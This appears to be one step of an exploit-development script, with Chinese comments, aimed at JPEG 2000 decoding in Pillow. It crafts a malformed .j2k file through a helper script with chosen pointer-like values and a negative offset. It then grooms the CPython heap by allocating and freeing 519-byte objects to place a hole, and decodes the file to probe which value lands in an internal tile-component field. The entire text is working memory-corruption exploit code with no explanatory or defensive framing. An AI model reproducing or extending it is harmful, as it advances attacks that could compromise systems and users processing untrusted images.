#!/usr/bin/env python3
# 步骤1（静默迭代）：测「哪个值落到 tile->comps(+0x18)」以及「真实 tilecomp 相对数组的偏移」
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
A, B, C = 0x111000, 0x222000, 0x333000     # 可区分、都可表达

r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/M.j2k', '0', '23',
                    hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
print("build:", r.stdout.strip() or r.stderr.strip()[:60])

gc.collect()
prime = [bytes(519) for _ in range(1024)]
del prime
pairs = []
for _ in range(400):
    D = bytes(519)
    Bb = bytes(bytearray(519))
    pairs.append((D, Bb))
good = [(D, Bb) for (D, Bb) in pairs if id(Bb) - id(D) == 0x230]
print("相邻对 =", len(good), "/", len(pairs))
if not good:
    sys.exit(0)
keep = [t for i, t in enumerate(good) if i != len(good) // 2]
Ks = [Bb for (D, Bb) in keep]
Dkeep = [D for (D, Bb) in keep]
holeD = good[len(good) // 2][0]
del holeD, pairs, good
gc.collect()

M = open('/tmp/M.j2k', 'rb').read()
try:
    im = Image.open(io.BytesIO(M)); im.load()
    print("decode ok", im.size)
except BaseException as e:
    print("decode err", repr(e))